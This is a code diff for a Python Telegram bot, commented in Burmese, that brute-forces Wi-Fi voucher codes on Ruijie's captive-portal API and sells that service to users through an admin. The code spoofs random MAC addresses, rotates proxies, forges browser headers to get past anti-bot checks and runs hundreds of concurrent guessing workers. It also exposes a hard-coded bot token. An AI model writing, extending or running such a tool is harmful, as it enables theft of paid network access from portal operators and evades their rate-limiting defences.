@@ -13,7 +13,6 @@ from typing import Callable, Dict, Any, Awaitable
 from aiogram import Bot, Dispatcher, types, BaseMiddleware
 from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from typing import Callable, Dict, Any, Awaitable
 
 class RateLimiter:
     def __init__(self, rate_limit_per_second: float):
@@ -41,9 +40,9 @@ class RateLimiter:
 
 # --- Configuration ---
 BOT_TOKEN="8819368227:AAFY0h2xNUv1ZNodLPpe0y3w7I-8rtMbrcw"
-BOT_ID = "bot1" # bot2, bot3 အတွက် ပြောင်းပေးရန်
+BOT_ID = "bot1"
 
-# Master Database (Render ပေါ်မှာ ကောင်းမွန်စွာ အလုပ်လုပ်ရန် လက်ရှိ Folder Path အား ယူခြင်း)
+# Render Cloud ပေါ်တွင် Error မတက်စေရန် လမ်းကြောင်းအား ပြင်ဆင်ခြင်း
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 MASTER_DB = os.path.join(BASE_DIR, "ruijie_master.db")
 
@@ -55,8 +54,8 @@ dp = Dispatcher()
 db = None
 
 # 🌟 Safe Limits (Ruijie IP Block မခံရစေရန် အလုံခြုံဆုံး သတ်မှတ်ချက်)
-ADMIN_RATE_LIMIT = 2500  
-USER_RATE_LIMIT = 1500   
+ADMIN_RATE_LIMIT = 2500 
+USER_RATE_LIMIT = 1500  
 admin_limiter = RateLimiter(ADMIN_RATE_LIMIT)
 user_limiter = RateLimiter(USER_RATE_LIMIT)
 
@@ -179,7 +178,7 @@ async def set_admin_worker_count(count):
 # --- Proxy Setup ---
 PROXIES = []
 try:
-    proxy_path = "/root/ruijie_bots/proxies.txt"
+    proxy_path = os.path.join(BASE_DIR, "proxies.txt")
     if os.path.exists(proxy_path):
         with open(proxy_path, "r") as f:
             PROXIES = [line.strip() for line in f if line.strip() and line.startswith("http")]
@@ -317,7 +316,7 @@ async def cmd_assign(message: types.Message):
     try: target_id = int(args[1])
     except: return await message.answer("❌ Invalid TG ID")
     target_bot = args[2].lower()
-    if target_bot not in ["bot1", "bot2", "bot3", "any"]: 
+    if target_bot not in ["bot1", "bot2", "bot3", "any"]:
         return await message.answer("❌ မှားယွင်းနေပါသည်။ bot1, bot2, bot3 သို့မဟုတ် any သာ ရိုက်ပါ။")
     
     await update_user(target_id, {"assigned_bot": target_bot})
@@ -397,7 +396,7 @@ async def cmd_worker_admin(message: types.Message):
 # ==========================================
 def generate_mac():
     m = [random.randint(0x00, 0xff) for _ in range(6)]
-    m[0] = (m[0] | 0x02) & 0xfe 
+    m[0] = (m[0] | 0x02) & 0xfe
     return ':'.join(f'{x:02x}' for x in m)
 
 async def get_session_id(session, url, current_sid, proxy=None):
@@ -405,7 +404,6 @@ async def get_session_id(session, url, current_sid, proxy=None):
     n_m = generate_mac()
     s_u_s = re.sub(r'mac=[^&]+', f'mac={n_m}', url) if 'mac=' in url else url
     
-    # 🌟 Security Headers (Ruijie Anti-Bot Bypass)
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -421,7 +419,6 @@ async def check_voucher(session, session_id, voucher, proxy=None):
     data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
     post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
     
-    # 🌟 Security Headers (Ruijie Anti-Bot Bypass)
     headers = {
         "authority": "portal-as.ruijienetworks.com",
         "accept": "*/*",
@@ -526,7 +523,6 @@ async def brute_force_task(message: types.Message, mode: str, length: int, targe
 
         vouchers_iter = voucher_generator()
         
-        # 🌟 TCP Limit (Safe Concurrency)
         connector = aiohttp.TCPConnector(limit=250, ttl_dns_cache=300, keepalive_timeout=60)
         start_time = asyncio.get_event_loop().time()
         initial_attempts = task_stats[tg_id]["attempts"]
@@ -540,7 +536,6 @@ async def brute_force_task(message: types.Message, mode: str, length: int, targe
                 nonlocal shared_session_id
                 local_loop_cnt = 0
                 
-                # 🌟 Stagger Start (Thundering Herd ကာကွယ်ရန်)
                 await asyncio.sleep(random.uniform(0.1, 2.5))
                 
                 while not stop_events[tg_id].is_set():
@@ -549,7 +544,7 @@ async def brute_force_task(message: types.Message, mode: str, length: int, targe
                     limiter = admin_limiter if tg_id == ADMIN_ID else user_limiter
                     await limiter.acquire()
 
-                    if local_loop_cnt > 0 and local_loop_cnt % 20 == 0: 
+                    if local_loop_cnt > 0 and local_loop_cnt % 20 == 0:
                         if not session_lock.locked():
                             async with session_lock:
                                 shared_session_id = await get_session_id(session, session_url, shared_session_id, proxy=current_proxy)
@@ -598,15 +593,13 @@ async def brute_force_task(message: types.Message, mode: str, length: int, targe
                              break
 
                     local_loop_cnt += 1
-                    
-                    # 🌟 Network Yielding (Display မထစ်စေရန်)
                     await asyncio.sleep(0.01)
 
             async def stats_updater():
                 try:
                     last_text = ""
                     while not stop_events[tg_id].is_set():
-                        await asyncio.sleep(3) 
+                        await asyncio.sleep(3)
                         
                         if batch_writes.get(tg_id):
                             ops = batch_writes[tg_id][:]
@@ -678,7 +671,6 @@ async def brute_force_task(message: types.Message, mode: str, length: int, targe
                     if not w.done(): w.cancel()
                 if not updater.done(): updater.cancel()
                 
-                # Final Batch Write
                 if batch_writes.get(tg_id):
                     ops = batch_writes[tg_id][:]
                     batch_writes[tg_id].clear()
@@ -754,7 +746,7 @@ async def cmd_start(message: types.Message):
         "`/stop` (ရပ်တန့်ရန်)\n\n"
     )
     
-    if tg_id == ADMIN_ID: 
+    if tg_id == ADMIN_ID:
         await message.answer(welcome + "**Admin Panel:**\n👉 Send `/admin` to open the control panel.", parse_mode="Markdown")
     else:
         welcome += f"💰 **အချိန်သက်တမ်း သို့မဟုတ် Code အရေအတွက် ဝယ်ယူရန်:**\n👉 ဆက်သွယ်ရန် - {ADMIN_USERNAME}\n\n"
@@ -1082,24 +1074,23 @@ async def cmd_refresh(message: types.Message):
     await message.answer("🔄 **Refresh အောင်မြင်ပါသည်!**\n\nသင့်၏ လက်ရှိ Run နေသော Task များနှင့် မှတ်ဉာဏ်များကို သန့်စင် ရှင်းလင်းပေးလိုက်ပါပြီ။ (Setup နှင့် Saved Code များ မပျက်ပါ)\n\n👉 `/brute` ဖြင့် အသစ်ကနေ ပြန်လည်စတင်နိုင်ပါပြီ။", parse_mode="Markdown")
 
 # ==========================================
-# 🌐 Main Execution
+# 🌐 Main Execution & Web Port Binding
 # ==========================================
 async def main():
     await init_db()
     print(f"Starting {BOT_ID} (Ultimate Safe & Stable Engine)...")
     
-    # Render အတွက် Fake Port ဖွင့်ပေးခြင်း
+    # 🚀 Render ပေါ်တွင် Port Scan Timeout မဖြစ်စေရန် Fake Port ဖွင့်ပေးခြင်း
     app = web.Application()
     runner = web.AppRunner(app)
     await runner.setup()
     port = int(os.environ.get("PORT", 10000))
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
-    print(f"Fake Web Server started on port {port} for Render.")
+    print(f"Fake Web Server successfully started on port {port} for Render.")
     
-    # Bot ကို Polling စတင် Run ခြင်း
+    # Bot Polling အား စတင်ပွင့်စေခြင်း
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
-
